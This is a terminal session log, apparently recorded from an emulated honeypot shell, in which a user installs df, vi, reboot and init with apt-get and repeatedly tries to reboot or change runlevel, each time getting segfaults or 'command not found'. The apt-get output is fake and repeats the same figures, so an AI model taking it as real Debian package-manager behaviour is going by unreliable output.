+Need to get 465.2kB of archives.
+After this operation, 1023.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main df 0.6-8 [465.2kB]
+Fetched 465.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking df (from .../archives/df_0.6-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up df (0.6-8) ...
+[4hlocalhost:~# df
+bash: df: command not found
+localhost:~# df -h
+bash: df: command not found
+localhost:~# re[1D[1P[1D[1Pat[1D[1Ppt-get install vi
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  vi 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 465.2kB of archives.
+After this operation, 1023.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main vi 1.19-6 [465.2kB]
+Fetched 465.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking vi (from .../archives/vi_1.19-6_i386.deb) ...
+Processing triggers for man-db ...
+Setting up vi (1.19-6) ...
+[4hlocalhost:~# [Kapt-get install vi[1D[1P[1D[1Preboot
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  reboot 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 474.2kB of archives.
+After this operation, 1042.8kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main reboot 1.33-8 [474.2kB]
+Fetched 474.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking reboot (from .../archives/reboot_1.33-8_i386.deb) ...
+Processing triggers for man-db ...
+Setting up reboot (1.33-8) ...
+[4hlocalhost:~# reboot
+[4lreboot: Segmentation fault
+[4hlocalhost:~# halt
+bash: halt: command not found
+localhost:~# inig 6
+bash: inig: command not found
+localhost:~# init 6
+bash: init: command not found
+localhost:~# apt-get install init
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  init 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 185.2kB of archives.
+After this operation, 407.0kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main init 1.37-10 [185.2kB]
+Fetched 185.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking init (from .../archives/init_1.37-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up init (1.37-10) ...
+[4hlocalhost:~# [Kapt-get install init[20D[Kinit 6
+[4linit: Segmentation fault
+[4hlocalhost:~# [Kinit 6[1D[1P5
+[4linit: Segmentation fault
+[4hlocalhost:~# [Kinit 5[1D[1P3
+[4linit: Segmentation fault
+[4hlocalhost:~# [Kinit 3[1D[1P
+[4linit: Segmentation fault
+[4hlocalhost:~# 1[1D[Kinit [1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pls
+[4l[4hlocalhost:~# 
